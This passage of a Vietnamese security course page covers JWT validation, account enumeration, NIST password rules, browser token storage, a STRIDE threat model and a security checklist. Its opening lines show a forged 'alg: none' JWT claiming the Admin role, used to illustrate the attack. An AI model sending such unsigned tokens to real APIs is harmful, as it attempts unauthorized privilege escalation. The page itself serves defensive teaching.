+<div class="jwt"><span class="h">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0</span><span class="dot">.</span><span class="p">eyJzdWIiOiJjaGkiLCJyb2xlcyI6WyJBZG1pbiJdfQ</span><span class="dot">.</span><span class="s"></span></div>
+<p class="small muted">Header giải mã: <code>{"alg":"none","typ":"JWT"}</code>; payload: <code>{"sub":"chi","roles":["Admin"]}</code>; phần chữ ký rỗng.</p>
+<p><b>Phòng vệ:</b> server quyết định thuật toán, không phải token: allowlist <code>alg</code> (<code>ValidAlgorithms</code>), khóa gắn với một thuật toán (khóa RSA chỉ dùng cho RS256), lấy khóa theo <code>kid</code> từ JWKS của issuer tin cậy, luôn kiểm tra <code>iss</code>, <code>aud</code>, <code>exp</code>, <code>nbf</code>, và loại token (<code>typ</code>, ví dụ <code>at+jwt</code> theo RFC 9068) để không nhận nhầm ID token. Dùng thư viện chuẩn (<code>Microsoft.IdentityModel</code>) thay vì tự parse. Xem checklist ở <a href="m02-crypto-session-token.html#jwt-validation">M02 — JWT validation</a>.</p>
+
+<h3 id="enum-recovery">C.7. Account enumeration và recovery flow <span class="badge should">Should</span></h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+<b>Account enumeration</b> (dò tài khoản): lễ tân trả lời “anh An <i>không làm ở đây</i>” khác với “anh An <i>đang bận</i>” — kẻ gian biết ngay ai là nhân viên. <b>Recovery flow yếu</b>: cửa chính có khóa vân tay, nhưng <b>cửa sau</b> (quên mật khẩu) chỉ cần nói tên con mèo.</div>
+<div class="table-wrap"><table>
+<thead><tr><th>Điểm lộ</th><th>❌ Lộ thông tin</th><th>✅ Nên làm</th></tr></thead>
+<tbody>
+<tr><td>Login</td><td>“Email không tồn tại” vs “Sai mật khẩu”</td><td>“Email hoặc mật khẩu không đúng”</td></tr>
+<tr><td>Quên mật khẩu</td><td>“Không tìm thấy tài khoản với email này”</td><td>“Nếu email tồn tại, chúng tôi đã gửi hướng dẫn”</td></tr>
+<tr><td>Đăng ký</td><td>“Email đã được dùng”</td><td>Gửi email thông báo tới địa chỉ đó thay vì báo trên UI (tùy yêu cầu UX)</td></tr>
+<tr><td>Thời gian phản hồi</td><td>Email tồn tại → hash mật khẩu (chậm); không tồn tại → trả ngay</td><td>Vẫn chạy hash giả để thời gian tương đương</td></tr>
+</tbody></table></div>
+<p><b>Recovery flow</b> là “cửa sau” của login: nếu login cần passkey nhưng “quên mật khẩu” chỉ cần trả lời “tên thú cưng đầu tiên” hoặc OTP SMS, kẻ tấn công sẽ đi cửa sau. Nguyên tắc: recovery phải mạnh tương đương, link/mã reset dùng một lần và hết hạn nhanh, thông báo cho người dùng qua kênh đã đăng ký, thu hồi session/refresh token cũ sau khi reset, có quy trình xác minh danh tính thủ công (helpdesk) chống social engineering.</p>
+
+<!-- ===================================================== -->
+<h2 id="nist-password">D. Mật khẩu theo NIST SP 800-63B-4 <span class="badge should">Should</span></h2>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+<b>NIST</b> (Viện Tiêu chuẩn và Công nghệ Hoa Kỳ) nói: một <b>câu dài dễ nhớ</b> (“com-ga-xoi-mo-buoi-sang-thu-hai”) mạnh hơn một <b>từ ngắn rắc rối</b> (“P@ss1!”). Đừng ép đổi mật khẩu định kỳ — người ta chỉ đổi “Mua1” thành “Mua2”. Thay vào đó: chặn mật khẩu phổ biến/đã lộ, giới hạn số lần đoán, và thêm MFA.</div>
+<p><b>SHALL</b> = bắt buộc, <b>SHOULD</b> = nên (khuyến nghị mạnh), <b>MAY</b> = được phép. Đây là cách viết chuẩn trong tài liệu NIST/RFC.</p>
+<p>Bản hiện hành là <b>NIST SP 800-63B-4</b> (<i>Digital Identity Guidelines: Authentication and Authenticator Management</i>), bản <b>final</b> phát hành tháng 7/2025, thay thế SP 800-63B (2017). Nguồn: <a href="https://pages.nist.gov/800-63-4/sp800-63b.html">pages.nist.gov/800-63-4/sp800-63b.html</a> và <a href="https://csrc.nist.gov/pubs/sp/800/63/b/4/final">csrc.nist.gov</a>. Các yêu cầu cho “password verifier” (mục 3.1.1.2) và rate limiting (mục 3.2.2):</p>
+<div class="table-wrap"><table>
+<thead><tr><th>Yêu cầu</th><th>Mức</th><th>Nội dung (diễn giải sát nguyên văn)</th></tr></thead>
+<tbody>
+<tr><td>Độ dài tối thiểu (mật khẩu là yếu tố duy nhất)</td><td><b>SHALL</b></td><td>Tối thiểu <b>15 ký tự</b>.</td></tr>
+<tr><td>Độ dài tối thiểu (chỉ dùng trong MFA)</td><td><b>SHALL</b> (MAY ngắn hơn 15)</td><td>Được phép ngắn hơn, nhưng tối thiểu <b>8 ký tự</b>.</td></tr>
+<tr><td>Độ dài tối đa</td><td><b>SHOULD</b></td><td>Cho phép tối đa <b>ít nhất 64 ký tự</b>.</td></tr>
+<tr><td>Ký tự cho phép</td><td><b>SHOULD</b></td><td>Chấp nhận mọi ký tự ASCII in được, dấu cách và ký tự Unicode; mỗi code point Unicode tính là một ký tự (<b>SHALL</b>).</td></tr>
+<tr><td>Composition rules</td><td><b>SHALL NOT</b></td><td>Không áp quy tắc kiểu “phải có chữ hoa, số, ký tự đặc biệt”.</td></tr>
+<tr><td>Đổi mật khẩu định kỳ</td><td><b>SHALL NOT</b></td><td>Không bắt đổi định kỳ; <b>SHALL</b> bắt đổi khi có bằng chứng mật khẩu bị lộ.</td></tr>
+<tr><td>Blocklist</td><td><b>SHALL</b></td><td>So sánh mật khẩu mới với danh sách mật khẩu phổ biến/dễ đoán/đã bị lộ; so sánh <b>toàn bộ</b> mật khẩu (không phải chuỗi con).</td></tr>
+<tr><td>Gợi ý mật khẩu (hint)</td><td><b>SHALL NOT</b></td><td>Không cho lưu hint mà người chưa xác thực truy cập được.</td></tr>
+<tr><td>Câu hỏi bảo mật (KBA)</td><td><b>SHALL NOT</b></td><td>Không yêu cầu dùng knowledge-based authentication khi chọn mật khẩu.</td></tr>
+<tr><td>Password manager, autofill</td><td><b>SHALL</b></td><td>Cho phép password manager và autofill.</td></tr>
+<tr><td>Paste</td><td><b>SHOULD</b></td><td>Cho phép dán (paste).</td></tr>
+<tr><td>Truncation</td><td><b>SHALL</b></td><td>Xác minh <b>toàn bộ</b> mật khẩu, không cắt bớt.</td></tr>
+<tr><td>Rate limiting (§3.2.2)</td><td><b>SHALL</b></td><td>Giới hạn số lần thất bại liên tiếp cho một authenticator ở một account <b>không quá 100</b> (MAY thấp hơn).</td></tr>
+</tbody></table></div>
+<div class="callout info"><span class="callout-title">ℹ️ Vì sao NIST bỏ “đổi mật khẩu định kỳ” và “quy tắc phức tạp”?</span>
+Bị ép đổi mỗi 90 ngày, người dùng chọn mẫu dễ đoán (<code>Spring2026!</code> → <code>Summer2026!</code>) hoặc ghi ra giấy. Quy tắc phức tạp tạo ra <code>P@ssw0rd1</code> — đủ “phức tạp” nhưng nằm đầu mọi danh sách đoán. <b>Độ dài</b> + <b>blocklist</b> + <b>MFA</b> + <b>rate limiting</b> + lưu trữ bằng <a href="m02-crypto-session-token.html#password-hashing">password hashing</a> đúng cách hiệu quả hơn nhiều. Đổi mật khẩu chỉ khi có dấu hiệu bị lộ.</div>
+<div class="callout warn"><span class="callout-title">⚠️ Ghi chú về con số trong roadmap</span>
+Roadmap viết “cho phép tối thiểu 64 ký tự” — nên hiểu là <b>độ dài tối đa cho phép phải ≥ 64</b> (và đây là mức <b>SHOULD</b>, không phải SHALL). Các con số 15/8 khớp với bản final SP 800-63B-4.</div>
+
+<div class="widget"><div class="w-title">🧪 Kiểm tra mật khẩu theo NIST (chạy hoàn toàn trong trình duyệt)</div>
+<p class="small">Không gửi đi đâu. Blocklist ở đây chỉ là danh sách mẫu rất nhỏ; thực tế dùng danh sách lớn (vd dữ liệu mật khẩu đã lộ).</p>
+<input id="pw-input" type="text" placeholder="Nhập mật khẩu thử" style="width:100%;padding:8px;font-family:inherit">
+<label class="small"><input type="checkbox" id="pw-mfa"> Mật khẩu chỉ dùng như một phần của MFA</label>
+<div class="btn-row"><button class="btn" id="pw-check">Kiểm tra</button></div>
+<div class="out" id="pw-out"></div>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="token-storage">E. Token storage trong browser <span class="badge must">Must</span></h2>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+Cất chìa khóa ở đâu? <code>localStorage</code> = <b>treo chìa ngoài cửa</b> (ai lọt vào sân là cầm đi được). Memory = <b>cầm chìa trong tay</b> (mất khi bạn ngủ/reload, kẻ lọt vào nhà vẫn sai bạn mở cửa được). Cookie HttpOnly = <b>chìa trong két, chỉ người giữ két dùng</b>. <b>BFF</b> (Backend for Frontend — một server nhỏ đứng sau SPA) = <b>chìa gửi ở bảo vệ tòa nhà</b>, bạn chỉ cầm vé gửi đồ. Nhưng nếu kẻ gian đã ở trong nhà (XSS), hắn vẫn có thể nhờ bạn đi lấy đồ hộ.</div>
+<div class="table-wrap"><table>
+<thead><tr><th>Nơi lưu</th><th>Rủi ro XSS</th><th>Rủi ro CSRF</th><th>Ghi chú</th></tr></thead>
+<tbody>
+<tr><td><code>localStorage</code> / <code>sessionStorage</code></td><td>🔴 Cao: script đọc và gửi token ra ngoài được</td><td>🟢 Thấp</td><td>Đơn giản nhưng mất token nếu có XSS; token còn dùng được sau khi nạn nhân đóng tab.</td></tr>
+<tr><td>Memory (biến JavaScript)</td><td>🟠 Trung bình: XSS vẫn gọi API khi trang đang mở, khó lấy token dùng lâu dài</td><td>🟢 Thấp</td><td>Mất khi reload → cần cơ chế lấy lại token (silent renew/refresh).</td></tr>
+<tr><td>Cookie <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code></td><td>🟡 Thấp hơn: JS không đọc được, nhưng XSS vẫn gửi request được</td><td>🟠 Cần chống CSRF</td><td>Phù hợp khi frontend và API cùng site.</td></tr>
+<tr><td><b>BFF</b> (token giữ ở server, browser chỉ có session cookie)</td><td>🟢 Thấp nhất: token không bao giờ vào browser</td><td>🟠 Cần chống CSRF</td><td>Khuyến nghị cho SPA xử lý dữ liệu nhạy cảm.</td></tr>
+</tbody></table></div>
+<div class="callout danger"><span class="callout-title">⛔ Không có nơi lưu nào miễn nhiễm hoàn toàn với XSS</span>
+Khi script độc đã chạy trong origin của bạn, nó có thể gọi API <b>như chính người dùng</b> — dù token nằm ở đâu. Cách lưu token chỉ quyết định <b>mức thiệt hại</b>: token bị mang đi dùng lâu dài (localStorage) hay chỉ bị lạm dụng khi tab đang mở (cookie HttpOnly/BFF). XSS phải được ngăn chặn <b>từ gốc</b>.</div>
+<div class="diagram">
+<pre class="mermaid">
+flowchart LR
+  subgraph Browser["🌐 Browser (không tin cậy hoàn toàn)"]
+    SPA["SPA JavaScript"]
+    CK["Cookie __Host-bff<br/>HttpOnly, Secure, SameSite"]
+  end
+  subgraph Server["🔒 Server (trust boundary)"]
+    BFF["BFF<br/>confidential client"]
+    TS[("Token store<br/>access + refresh token")]
+  end
+  IdP["IdP / Authorization Server"]
+  API["Order API"]
+  SPA -- "fetch /bff/api/orders + cookie + X-CSRF" --> BFF
+  BFF --- TS
+  BFF -- "OIDC code flow + client secret" --> IdP
+  BFF -- "Bearer access token" --> API
+</pre>
+<div class="caption">BFF: token nằm ở server; browser chỉ có session cookie. Pattern này được mô tả là lựa chọn an toàn nhất trong RFC 10017 (OAuth 2.0 for Browser-Based Applications). Sequence chi tiết ở <a href="m07-architecture.html#bff">M07 — BFF</a>.</div>
+</div>
+
+<!-- ===================================================== -->
+<h2 id="best-practices">F. Security best practices <span class="badge must">Must</span></h2>
+<div class="grid cols-2">
+<div class="card"><span class="icon">🔐</span><h4>Xác thực</h4><p>Bật MFA; ưu tiên phishing-resistant MFA/passkey. Chính sách mật khẩu theo <a href="#nist-password">NIST</a>. SMS OTP chỉ là dự phòng. Recovery mạnh ngang login.</p></div>
+<div class="card"><span class="icon">🔁</span><h4>Flow &amp; client</h4><p>Authorization Code + PKCE cho public client (<a href="m03-oauth-oidc.html#auth-code-pkce">M03</a>). Không nhúng client secret trong desktop/mobile/SPA. Bảo vệ <code>redirect_uri</code>, <code>state</code>, <code>nonce</code> (<a href="m03-oauth-oidc.html#state-nonce">M03</a>).</p></div>
+<div class="card"><span class="icon">🎫</span><h4>Token</h4><p>Xác minh issuer, audience, signature, expiration và token type. Access token ngắn hạn; refresh token rotation + reuse detection (<a href="m02-crypto-session-token.html#token-lifecycle">M02</a>). Không đưa token vào URL, log, source control, error message.</p></div>
+<div class="card"><span class="icon">🍪</span><h4>Session &amp; browser</h4><p>HTTPS/TLS; cookie <code>Secure</code>, <code>HttpOnly</code>, <code>SameSite</code> phù hợp. Chống CSRF/XSS; hiểu <a href="#token-storage">token storage trade-off</a>.</p></div>
+<div class="card"><span class="icon">🛂</span><h4>Authorization</h4><p>Least privilege, deny by default, kiểm tra quyền ở server và ở mức object (chống BOLA).</p></div>
+<div class="card"><span class="icon">📒</span><h4>Audit &amp; vận hành</h4><p>Audit log <b>không</b> ghi credential, access/refresh token, dữ liệu nhạy cảm. Có quy trình account recovery, revoke session/token, mất thiết bị, offboarding. Quản lý signing key/certificate, rotation, expiration, secret storage.</p></div>
+</div>
+
+<h2 id="hieu-lam">Các hiểu lầm cần tránh</h2>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Token hợp lệ = được phép.</span><span class="f-label">Thực tế</span><span>Token hợp lệ chỉ chứng minh authentication. Vẫn cần kiểm tra scope, role, ownership, business rule — API trả 403 là hoàn toàn hợp lý.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Có scope <code>orders.read</code> là đọc được mọi đơn.</span><span class="f-label">Thực tế</span><span>Scope giới hạn client; quyền trên từng đơn do API quyết định theo user và dữ liệu.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Ẩn nút trên UI là đủ.</span><span class="f-label">Thực tế</span><span>Ai cũng gọi API trực tiếp được. API phải tự kiểm tra.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Cookie HttpOnly chống được XSS.</span><span class="f-label">Thực tế</span><span>HttpOnly chỉ ngăn JS <b>đọc</b> cookie; script vẫn gửi request kèm cookie từ browser nạn nhân.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Đã có MFA (OTP/push) thì miễn nhiễm phishing.</span><span class="f-label">Thực tế</span><span>AiTM chuyển tiếp OTP/push và lấy session cookie sau MFA. Chỉ phishing-resistant MFA (FIDO2/passkey) chặn được.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Dùng GUID làm ID là hết IDOR.</span><span class="f-label">Thực tế</span><span>GUID chỉ khó đoán; ID vẫn lộ qua URL, log, chia sẻ. Kiểm tra quyền ở mức object là bắt buộc.</span></div>
+<div class="myth"><span class="m-label">Hiểu lầm</span><span>Mật khẩu phải có chữ hoa, số, ký tự đặc biệt và đổi mỗi 90 ngày.</span><span class="f-label">Thực tế</span><span>NIST SP 800-63B-4: SHALL NOT composition rules, SHALL NOT đổi định kỳ; ưu tiên độ dài + blocklist.</span></div>
+
+<h2 id="tom-tat">Tóm tắt nhanh</h2>
+<ul>
+<li><b>Authentication</b> trả lời “bạn là ai”; <b>authorization</b> trả lời “bạn được làm gì” — token hợp lệ vẫn có thể bị <b>403</b>.</li>
+<li><b>Scope</b> giới hạn <i>client</i>, <b>role</b> mô tả <i>user</i>, <b>ownership/business rule</b> gắn với <i>tài nguyên cụ thể</i>. Cần cả ba.</li>
+<li><b>RBAC</b> đơn giản nhưng dễ role explosion; <b>ABAC</b> linh hoạt theo thuộc tính; <b>ACL</b> theo từng tài nguyên; <b>ReBAC</b> theo quan hệ. Thực tế thường kết hợp.</li>
+<li>Pipeline API: authN middleware → policy coarse (scope/role) → tải tài nguyên → resource-based (fine) → business rule.</li>
+<li><b>Deny by default</b> (FallbackPolicy) + <b>least privilege</b>; không chỉ ẩn nút UI; kiểm tra quyền ở mức object để chống <b>BOLA/IDOR</b>.</li>
+<li><b>CSRF</b> lợi dụng cookie tự gửi → SameSite + anti-CSRF token + Origin check. <b>XSS</b> chạy script trong origin → encoding, CSP; XSS phá được mọi chống CSRF.</li>
+<li>OTP/push <b>không</b> chống được <b>AiTM</b>; <b>passkey/FIDO2</b> chống được vì chữ ký gắn với origin. Number matching chống <b>MFA fatigue</b>.</li>
+<li>Server quyết định thuật toán JWT (allowlist <code>alg</code>), luôn kiểm tra <code>iss</code>, <code>aud</code>, <code>exp</code>, token type.</li>
+<li>NIST SP 800-63B-4: ≥ 15 ký tự (single-factor), ≥ 8 (trong MFA), max ≥ 64, blocklist, <b>không</b> composition rules, <b>không</b> đổi định kỳ.</li>
+<li>Không nơi lưu token nào miễn nhiễm XSS; với SPA nhạy cảm, ưu tiên <b>BFF</b>.</li>
+</ul>
+
+<!-- ===================================================== -->
+<h2 id="output">Output / Deliverables</h2>
+<ul class="checklist">
+<li><span><b>Bảng so sánh</b> RBAC, ABAC, ACL, ReBAC — xem <a href="#authz-compare">A.7</a>.</span></li>
+<li><span><b>Một ví dụ authorization policy cho API</b>, mở rộng từ code Lab 2 — xem <a href="#authz-code">B.6</a>. <span class="badge core">Core</span></span></li>
+<li><span><b>Threat model đơn giản</b> cho login và gọi API, có phishing/AiTM, token theft, CSRF/XSS — xem <a href="#threat-model">mẫu bên dưới</a>. <span class="badge core">Core</span></span></li>
+<li><span><b>Security checklist master</b> cho authentication/token/session/password, gộp checklist M02–M03 — xem <a href="#security-checklist">bên dưới</a>. <span class="badge core">Core</span></span></li>
+<li><span><b>Phân tích ≥ 5 tình huống</b>: token hết hạn, sai audience, CSRF, refresh token reuse, đã login nhưng thiếu quyền — xem <a href="#scenarios">bên dưới</a>. <span class="badge core">Core</span></span></li>
+</ul>
+
+<h3 id="threat-model">Mẫu threat model: login + gọi API (deliverable 3)</h3>
+<div class="eli5"><span class="eli5-title">Nói đơn giản</span>
+<b>Threat model</b> (mô hình mối đe dọa) giống việc đi một vòng quanh nhà và hỏi: “<i>Kẻ trộm có thể vào bằng đường nào? Mình đã khóa đường đó chưa?</i>”. <b>STRIDE</b> là danh sách gợi ý 6 kiểu đột nhập: <b>S</b>poofing (giả danh), <b>T</b>ampering (sửa dữ liệu), <b>R</b>epudiation (chối bỏ hành động), <b>I</b>nformation disclosure (lộ thông tin), <b>D</b>enial of service (làm tê liệt), <b>E</b>levation of privilege (leo thang quyền). <b>Trust boundary</b> (ranh giới tin cậy) là “bức tường” giữa vùng bạn kiểm soát và vùng bạn không kiểm soát.</div>
+<p>Phạm vi: SPA “Order Portal” đăng nhập qua IdP (OIDC code + PKCE, hoặc qua BFF) và gọi Order API. Trước hết vẽ <b>trust boundary</b> — mọi mũi tên cắt qua ranh giới là nơi cần kiểm tra.</p>
+<div class="diagram">
+<pre class="mermaid">
+flowchart LR
+  U(("👤 User"))
+  subgraph TB1["Trust boundary 1: thiết bị người dùng"]
+    BR["Browser + SPA"]
+  end
+  subgraph TB2["Trust boundary 2: IdP"]
+    IDP["IdP<br/>login, MFA, token"]
+  end
+  subgraph TB3["Trust boundary 3: hạ tầng công ty"]
+    API["Order API"]
+    DB[("Order DB")]
+    LOG[("Audit log")]
+  end
+  ATK["☠️ Attacker<br/>phishing site, evil.example"]
+  U --> BR
+  BR -- "① redirect login (code + PKCE)" --> IDP
+  IDP -- "② code → token" --> BR
+  BR -- "③ Bearer token / cookie" --> API
+  API --> DB
+  API --> LOG
+  ATK -. "AiTM, CSRF, XSS payload" .-> BR
+  ATK -. "stuffing, brute force" .-> IDP
+  ATK -. "BOLA, token replay" .-> API
+</pre>
+<div class="caption">Ba trust boundary và các điểm tấn công chính.</div>
+</div>
+<div class="table-wrap"><table>
+<thead><tr><th>STRIDE</th><th>Threat cụ thể</th><th>Điểm</th><th>Biện pháp</th><th>Còn lại / chấp nhận</th></tr></thead>
+<tbody>
+<tr><td><b>S</b>poofing</td><td>Phishing / AiTM lấy session sau MFA</td><td>① IdP</td><td>Passkey cho mọi user, conditional access thiết bị được quản lý, phát hiện impossible travel</td><td>User chưa đăng ký passkey dùng OTP → rủi ro trung bình</td></tr>
+<tr><td><b>S</b>poofing</td><td>Credential stuffing / brute force</td><td>① IdP</td><td>MFA, rate limit, blocklist mật khẩu, thông báo lỗi chung</td><td>—</td></tr>
+<tr><td><b>S</b>poofing</td><td>Token giả (alg none, key confusion), ID token dùng làm access token</td><td>③ API</td><td>JwtBearer + <code>ValidAlgorithms</code>, kiểm tra <code>iss</code>/<code>aud</code>/<code>exp</code>/<code>typ</code></td><td>—</td></tr>
+<tr><td><b>T</b>ampering</td><td>CSRF thay đổi đơn (nếu dùng cookie/BFF)</td><td>③</td><td>SameSite=Lax/Strict + antiforgery/custom header + Origin check</td><td>—</td></tr>
+<tr><td><b>T</b>ampering</td><td>Client tự gửi <code>role=Manager</code></td><td>③</td><td>Role chỉ lấy từ token/DB</td><td>—</td></tr>
+<tr><td><b>R</b>epudiation</td><td>Manager chối đã duyệt đơn</td><td>API</td><td>Audit log: <code>sub</code>, action, resource, thời gian, IP (không ghi token)</td><td>—</td></tr>
+<tr><td><b>I</b>nfo disclosure</td><td>XSS đánh cắp token trong localStorage</td><td>Browser</td><td>BFF hoặc token trong memory, CSP, encoding</td><td>XSS vẫn gọi API khi tab mở → ưu tiên ngăn XSS</td></tr>
+<tr><td><b>I</b>nfo disclosure</td><td>Token lộ qua log/URL/telemetry</td><td>Mọi nơi</td><td>Không log header Authorization, không token trong query, lifetime ngắn</td><td>—</td></tr>
+<tr><td><b>I</b>nfo disclosure</td><td>BOLA: đọc đơn người khác</td><td>③ API</td><td>Resource-based authorization, test tự động cho mọi endpoint có ID</td><td>—</td></tr>
+<tr><td><b>D</b>oS</td><td>Spam login gây khóa tài khoản người khác</td><td>① IdP</td><td>Throttling theo IP/risk thay vì khóa cứng</td><td>—</td></tr>
+<tr><td><b>E</b>levation</td><td>Refresh token bị đánh cắp dùng lâu dài</td><td>Browser/IdP</td><td>Rotation + reuse detection, refresh token lifetime giới hạn, revoke khi logout</td><td>—</td></tr>
+<tr><td><b>E</b>levation</td><td>Endpoint mới quên <code>[Authorize]</code></td><td>API</td><td>FallbackPolicy deny by default</td><td>—</td></tr>
+</tbody></table></div>
+
+<h3 id="security-checklist">Security checklist master (deliverable 4)</h3>
+<p>Gộp checklist <a href="m02-crypto-session-token.html">M02</a> (crypto, session, token, JWT) và <a href="m03-oauth-oidc.html">M03</a> (OAuth/OIDC). <a href="m07-architecture.html#decision-matrix">M07</a> bổ sung phần kiến trúc (BFF, CORS, mTLS, key rotation, secret management).</p>
+<h4>Password &amp; login</h4>
+<ul class="checklist">
+<li><span>Mật khẩu hash bằng thuật toán chậm có salt (Argon2id/bcrypt/PBKDF2) — không mã hóa, không hash nhanh (<a href="m02-crypto-session-token.html#password-hashing">M02</a>).</span></li>
+<li><span>Độ dài ≥ 15 (single-factor) / ≥ 8 (trong MFA), max ≥ 64, blocklist, không composition rules, không đổi định kỳ, không hint/câu hỏi bảo mật, cho paste/password manager.</span></li>
+<li><span>Rate limiting (≤ 100 lần sai liên tiếp theo NIST; thực tế thường thấp hơn) + phát hiện stuffing.</span></li>
+<li><span>Thông báo lỗi login/reset không lộ account tồn tại.</span></li>
+<li><span>MFA bật; ưu tiên passkey/FIDO2; push dùng number matching; SMS chỉ dự phòng.</span></li>
+<li><span>Recovery flow mạnh ngang login; link reset dùng 1 lần, hết hạn nhanh; revoke session sau reset.</span></li>
+</ul>
+<h4>Session &amp; cookie</h4>
+<ul class="checklist">
+<li><span>Cookie <code>Secure</code>, <code>HttpOnly</code>, <code>SameSite</code> khai báo rõ; ưu tiên tiền tố <code>__Host-</code> (<a href="m02-crypto-session-token.html#cookie-attributes">M02</a>).</span></li>
+<li><span>Cấp session ID mới sau login và khi đổi đặc quyền (chống session fixation).</span></li>
+<li><span>Idle timeout + absolute timeout; logout hủy session phía server.</span></li>
+<li><span>Chống CSRF cho mọi request thay đổi trạng thái dùng cookie; GET không thay đổi trạng thái.</span></li>
+<li><span>CSP, output encoding; không dùng <code>innerHTML</code> với dữ liệu người dùng.</span></li>
+</ul>
+<h4>OAuth/OIDC flow (client)</h4>
+<ul class="checklist">
+<li><span>Authorization Code + PKCE (S256) cho mọi client; không dùng Implicit/ROPC (<a href="m03-oauth-oidc.html#ropc-implicit">M03</a>).</span></li>
+<li><span>Kiểm tra <code>state</code> (chống CSRF login) và <code>nonce</code> trong ID token (chống replay).</span></li>
+<li><span><code>redirect_uri</code> đăng ký khớp chính xác, không wildcard.</span></li>
+<li><span>Không nhúng client secret trong SPA/desktop/mobile.</span></li>
+<li><span>Định danh user bằng <code>iss</code> + <code>sub</code>, không bằng email (<a href="m03-oauth-oidc.html#iss-sub">M03</a>).</span></li>
+<li><span>Logout: xóa session app + (nếu cần) RP-initiated logout ở IdP + revoke refresh token.</span></li>
+</ul>
+<h4>Token (API / resource server)</h4>
+<ul class="checklist">
+<li><span>Xác minh chữ ký với khóa từ JWKS của issuer tin cậy; allowlist <code>alg</code>.</span></li>
+<li><span>Kiểm tra <code>iss</code>, <code>aud</code>, <code>exp</code>/<code>nbf</code> (clock skew nhỏ), token type — không nhận ID token làm access token.</span></li>
+<li><span>Access token ngắn hạn (phút–giờ); refresh token rotation + reuse detection.</span></li>
+<li><span>Không đưa token vào URL, log, error message, telemetry, source control.</span></li>
+<li><span>Có cơ chế revoke/introspection cho tình huống khẩn cấp (<a href="m02-crypto-session-token.html#introspection-revocation">M02</a>).</span></li>
+<li><span><code>MapInboundClaims = false</code> (hoặc hiểu rõ claim mapping) để policy khớp đúng claim.</span></li>
+</ul>
+<h4>Authorization</h4>
+<ul class="checklist">
+<li><span>FallbackPolicy deny by default; <code>[AllowAnonymous]</code> có chủ đích và được review.</span></li>
+<li><span>Coarse-grained (scope/role) + fine-grained (resource/business rule) cho mọi endpoint có ID.</span></li>
+<li><span>Không tin role/ID do client gửi; lấy từ token đã xác minh.</span></li>
+<li><span>Least privilege cho client, service, DB account.</span></li>
+<li><span>Audit log quyết định quan trọng (không ghi token/credential).</span></li>
+</ul>
+
+<h3 id="scenarios">Phân tích 5 tình huống (deliverable 5)</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>Tình huống</th><th>Hiện tượng</th><th>Nguyên nhân / tầng</th><th>Xử lý đúng</th></tr></thead>
+<tbody>
+<tr><td>1. Token hết hạn</td><td><code>401</code>, <code>WWW-Authenticate: Bearer error="invalid_token", error_description="The token expired..."</code></td><td>Authentication: <code>exp</code> đã qua (cộng clock skew).</td><td>Client dùng refresh token lấy access token mới rồi gọi lại <b>một lần</b>; nếu refresh thất bại → đăng nhập lại. Không kéo dài lifetime để “né” lỗi.</td></tr>
+<tr><td>2. Sai audience</td><td><code>401</code>, mô tả “audience is invalid”</td><td>Token được cấp cho API khác (vd <code>aud=account</code> hoặc của service khác) hoặc gửi nhầm ID token (<code>aud</code> = client_id).</td><td>Xin token đúng resource/scope cho API này; API <b>không</b> nới <code>ValidAudience</code>. Audience ngăn token cấp cho API A bị dùng lại ở API B.</td></tr>
+<tr><td>3. CSRF</td><td>Đơn bị duyệt/xóa mà user không chủ động; log thấy <code>Origin: evil.example</code></td><td>App dùng cookie, thiếu SameSite/anti-CSRF.</td><td>SameSite=Lax/Strict + antiforgery token hoặc custom header + kiểm tra Origin; điều tra và rotate session bị ảnh hưởng.</td></tr>
+<tr><td>4. Refresh token reuse</td><td>IdP trả <code>invalid_grant</code>; toàn bộ phiên của user bị thu hồi</td><td>Rotation + reuse detection phát hiện refresh token <b>cũ</b> được dùng lại → dấu hiệu bị đánh cắp (hoặc client có race condition gọi refresh song song).</td><td>Buộc user đăng nhập lại, điều tra nguồn rò rỉ; phía client đồng bộ hóa việc refresh (một luồng refresh tại một thời điểm).</td></tr>
+<tr><td>5. Đã login nhưng thiếu quyền</td><td><code>403 Forbidden</code></td><td>Authorization: thiếu scope <code>orders.write</code>, không phải Manager, hoặc khác phòng ban.</td><td>Trả 403 (không phải 401, không redirect login). Client hiển thị “không đủ quyền”; nếu thiếu scope → xin consent scope mới; nếu thiếu role → yêu cầu cấp quyền qua quy trình.</td></tr>
+</tbody></table></div>
+<p>Các tình huống 1, 2, 5 đã được tái hiện ở <a href="lab.html#lab2">Lab 2</a>, tình huống 4 ở <a href="lab.html#lab4">Lab 4</a>. Xem thêm bảng lỗi ở <a href="lab.html#error-table">Lab — error table</a> và <a href="m07-architecture.html#troubleshooting">M07 — Troubleshooting</a>.</p>
+
+<!-- ===================================================== -->
+<h2 id="knowledge-check">Knowledge Check (tự luận)</h2>
+<details><summary>Authentication thành công nhưng API trả 403 là có thể hợp lý không?</summary>
+<p>Hoàn toàn hợp lý. 403 nghĩa là API <b>đã biết bạn là ai</b> (token hợp lệ) nhưng bạn không đủ quyền: thiếu scope, thiếu role, không phải chủ tài nguyên hoặc vi phạm business rule. Đó chính là bằng chứng authentication và authorization là hai bước độc lập.</p></details>
+<details><summary>Scope khác role thế nào?</summary>
+<p><b>Scope</b> giới hạn những gì <b>client</b> được làm thay user (được cấp bởi Authorization Server, thường qua consent). <b>Role</b> mô tả <b>user</b> là ai trong tổ chức/ứng dụng (gói permission). Quyền hiệu lực là giao của hai thứ, cộng với rule trên tài nguyên. Ví dụ: Bình là Manager nhưng app báo cáo chỉ có <code>orders.read</code> → app không được duyệt đơn thay Bình.</p></details>
+<details><summary>Vì sao ẩn nút trên UI không đủ để bảo vệ API?</summary>
+<p>UI chạy trên máy người dùng — họ có thể gọi API trực tiếp bằng curl/Postman, sửa JavaScript hoặc request trong DevTools. Ẩn nút chỉ là UX. API là trust boundary và phải tự kiểm tra quyền cho mọi request.</p></details>
+<details><summary>Vì sao public client không thể giữ client secret?</summary>
